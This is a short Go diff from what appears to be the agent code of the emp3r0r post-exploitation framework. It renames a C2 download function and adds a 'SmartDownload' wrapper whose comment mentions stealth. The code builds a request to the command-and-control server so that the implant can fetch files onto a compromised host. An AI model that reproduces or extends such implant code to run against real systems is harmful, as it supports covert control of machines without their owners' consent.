@@ -45,9 +45,16 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	return checksum, Send2CC(&fileData)
 }
 
-// DownloadViaCC download via EmpHTTPClient
+// SmartDownload download via grab, if path is empty, return []byte instead
+// This will try to download from other agents for better speed and stealth
+// when fail, will try to download from CC
+func SmartDownload(file_to_download, path string) (data []byte, err error) {
+	return DownloadViaC2(file_to_download, path)
+}
+
+// DownloadViaC2 download via EmpHTTPClient
 // if path is empty, return []data instead
-func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
+func DownloadViaC2(file_to_download, path string) (data []byte, err error) {
 	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
 		emp3r0r_data.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
 	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
